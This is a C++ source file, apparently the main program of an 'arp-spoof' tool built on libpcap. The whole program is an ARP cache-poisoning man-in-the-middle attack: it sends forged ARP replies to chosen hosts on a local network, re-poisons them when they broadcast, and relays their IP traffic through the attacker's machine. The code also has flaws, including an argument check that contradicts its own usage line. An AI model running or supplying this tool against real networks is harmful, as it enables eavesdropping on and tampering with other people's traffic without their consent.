#include <cstdio>
#include <iostream>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <net/if.h>
#include "arp.h"
#include "get_attackerinfo.h"

using namespace std;

#pragma pack(push, 1)
struct EthIpPacket {
    EthHdr eth_;
    ip ip_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


int main(int argc, char* argv[]) {
    if (argc != 4 || (argc%2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac attacker_mac = get_mymac(dev);
    Ip attacker_ip = get_myip(dev);

    const int flow_count = (argc-2)/2;
    EthArpPacket* flow = new EthArpPacket[flow_count];

    int n=0;
    for(int i=0; i<argc; i+=2) {
        if(i > 1) {
            flow[n].arp_.sip_ = Ip(argv[i]);
            flow[n].arp_.tip_ = Ip(argv[i+1]);
            n++;
        }
    }

    for(int i=0; i<flow_count; i++) {
        Ip sender_ip = flow[i].arp_.sip_;
        Ip target_ip = flow[i].arp_.tip_;

        arp_request(attacker_mac, attacker_ip, sender_ip, handle);
        arp_request(attacker_mac, attacker_ip, target_ip, handle);
    }

    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        struct EthArpPacket *etharp = (struct EthArpPacket *)packet;

        if(etharp->eth_.type_ == htons(EthHdr::Arp)) {
            if(etharp->arp_.op_ == htons(ArpHdr::Reply)) {
                for(int i=0; i<flow_count; i++) {
                    if(htonl(etharp->arp_.sip_) == flow[i].arp_.sip_) {
                        cout << "Arp infect" << '\n';
                        flow[i].arp_.smac_ = etharp->arp_.smac_;
                        arp_reply(attacker_mac, flow[i].eth_.smac_, flow[i].arp_.sip_, flow[i].arp_.tip_, handle);
                        continue;
                    }

                    if(htonl(etharp->arp_.sip_) == flow[i].arp_.tip_) {
                        flow[i].eth_.dmac_ = etharp->arp_.smac_;
                    }
                }
                continue;
            }

            if(etharp->arp_.op_ == htons(ArpHdr::Request)) {
                if(etharp->eth_.dmac_ == Mac("FF:FF:FF:FF:FF:FF")) {
                    for(int i=0; i<flow_count; i++) {
                        cout << "ARP REINFECT" << '\n';
                        arp_request(attacker_mac, attacker_ip, flow[i].arp_.sip_, handle);
                        arp_request(attacker_mac, attacker_ip, flow[i].arp_.tip_, handle);
                        arp_reply(attacker_mac, flow[i].eth_.smac_, flow[i].arp_.sip_, flow[i].arp_.tip_, handle);
                    }
                }
                continue;
            }
        }

        if(etharp->eth_.type_ == htons(EthHdr::Ip4)) {
            struct EthIpPacket* ethip = (struct EthIpPacket *)packet;
            if(htonl(ethip->ip_.ip_dst.s_addr) == attacker_ip) {
                continue;
            }

            for(int i=0; i<flow_count; i++) {
                if(htonl(ethip->ip_.ip_dst.s_addr) == flow[i].arp_.sip_) {
                    ethip->eth_.smac_ = attacker_mac;
                    ethip->eth_.dmac_ = flow[i].eth_.smac_;

                    pcap_sendpacket(handle, packet, header->len);
                    continue;
                }

                if(htonl(ethip->ip_.ip_src.s_addr) == flow[i].arp_.sip_) {
                    ethip->eth_.smac_ = attacker_mac;
                    ethip->eth_.dmac_ = flow[i].eth_.dmac_;

                    res = pcap_sendpacket(handle, packet, header->len);
                    continue;
                }
            }
        }
    }
    pcap_close(handle);
}


